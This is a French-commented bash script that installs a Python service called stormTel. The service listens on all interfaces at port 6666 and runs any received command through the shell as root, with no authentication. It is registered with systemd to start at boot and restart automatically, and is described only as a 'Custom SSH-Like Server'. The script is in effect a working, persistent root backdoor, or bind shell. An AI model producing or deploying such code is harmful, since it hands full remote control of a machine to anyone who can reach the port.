#!/bin/bash

# Variables
SERVICE_NAME="stormTel"
SCRIPT_PATH="/opt/$SERVICE_NAME/stormTel.py"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME.service"

# Créer le répertoire
mkdir -p /opt/$SERVICE_NAME

# Copier le script
cat << 'EOF' > $SCRIPT_PATH
#!/usr/bin/env python3
import socket
import subprocess

HOST = "0.0.0.0"
PORT = 6666

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"Serveur en écoute sur {HOST}:{PORT}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Connexion établie avec {client_address}")
            with client_socket:
                while True:
                    command = client_socket.recv(1024).decode("utf-8")
                    if not command or command.lower() == "exit":
                        print("Fermeture de la connexion.")
                        break

                    try:
                        result = subprocess.check_output(
                            command, shell=True, stderr=subprocess.STDOUT, text=True
                        )
                    except subprocess.CalledProcessError as e:
                        result = f"Erreur lors de l'exécution : {e.output}"

                    client_socket.sendall(result.encode("utf-8"))

if __name__ == "__main__":
    start_server()
EOF

# Rendre le script exécutable
chmod +x $SCRIPT_PATH

# Créer le fichier de service
cat << EOF > $SERVICE_PATH
[Unit]
Description=Custom SSH-Like Server
After=network.target

[Service]
ExecStart=/usr/bin/python3 $SCRIPT_PATH
WorkingDirectory=/opt/$SERVICE_NAME
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Recharger systemd, activer et démarrer le service
systemctl daemon-reload
systemctl enable $SERVICE_NAME.service
systemctl start $SERVICE_NAME.service

# Statut du service
systemctl status $SERVICE_NAME.service  
